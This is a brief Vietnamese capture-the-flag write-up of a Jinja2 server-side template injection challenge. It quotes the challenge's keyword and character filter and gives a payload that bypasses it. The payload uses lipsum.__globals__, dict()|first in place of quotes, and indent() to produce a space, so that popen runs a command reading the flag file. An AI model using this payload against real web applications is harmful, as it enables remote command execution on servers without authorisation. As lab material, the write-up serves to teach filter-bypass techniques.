# Solution


Từ file `app.py` có thể thấy đề filter `regex = "request|config|self|class|flag|0|1|2|3|4|5|6|7|8|9|\"|\'|\\|\~|\%|\#"`

vì vậy ta cần contruct payload sao cho không bị vướng regex expression này

final payload:
```
{{lipsum.__globals__.__getitem__(dict(os=x)|first).popen((dict(cat=x)|first)+(dict(fl=x)|first|indent((dict(bla=x)|first)|length,true))+(dict(ag=x)|first)).read()}}
```

Giải thích một tí: 

Vì đề không cho dùng `'` nên mình dùng `dict()` để thay thế: `(dict(os=x)|first) -> 'os'`

để tạo ra space thì mình dùng `indent()`, đọc thêm ở [đây](https://tedboy.github.io/jinja2/templ14.html#indent)

Kết quả:

![flag](https://user-images.githubusercontent.com/77546253/176494531-0b33bf8a-192f-42cb-8f26-ff9ec29136a7.png)

